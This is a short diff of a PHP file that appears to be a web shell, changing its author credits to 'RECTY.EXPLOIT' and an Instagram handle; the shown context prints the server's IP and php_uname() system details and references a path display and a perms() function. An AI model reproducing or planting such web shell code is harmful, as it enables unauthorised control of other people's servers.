@@ -188,7 +188,7 @@ echo "<tr><td><font color='white'>
 + IP Server  <td>: <font color='LightBlue'>".gethostbyname($_SERVER['HTTP_HOST'])."<tr><td><font color='white'>
 + system     <td>: <font color='LightBlue'>".php_uname()."<tr><td><font color='white'>
 + Coded By   <td>: <font color='LightBlue'>RECTY.EXPLOIT<tr><td><font color='white'>
-+ Instagram <td>: <font color='LightBlue'><tr><td><font color='white'>
++ Instagram <td>: <font color='LightBlue'>recty.exploit<tr><td><font color='white'>
 </table>";
 echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
 <center><tr align="center"><td align="center">path : ';
@@ -1084,7 +1084,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Zildan</center>
+echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">By RECTY.EXPLOIT</center>
 </body>
 </html>';
 function perms($file){
